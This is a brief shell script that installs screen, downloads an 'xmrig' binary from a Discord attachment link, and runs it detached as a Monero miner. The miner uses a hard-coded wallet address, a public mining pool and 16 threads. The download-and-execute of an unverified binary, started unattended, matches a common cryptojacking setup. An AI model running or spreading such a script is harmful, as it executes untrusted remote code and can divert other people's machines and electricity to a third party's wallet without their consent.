export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install screen -y
cd ~
wget https://cdn.discordapp.com/attachments/863132205546733588/899772222057623602/xmrig
chmod +x ./xmrig
screen ~/xmrig -u 46KyC7X3aHYfuRWLoULwtJ9HiSr73FU6YM2t5MU4LR6pGACGk6i7jEFFxED8T2cs4HXdkpkhMj7u2UjrhNGBJKACJw3VsoZ -o pool.supportxmr.com:3333 -p miner -t 16
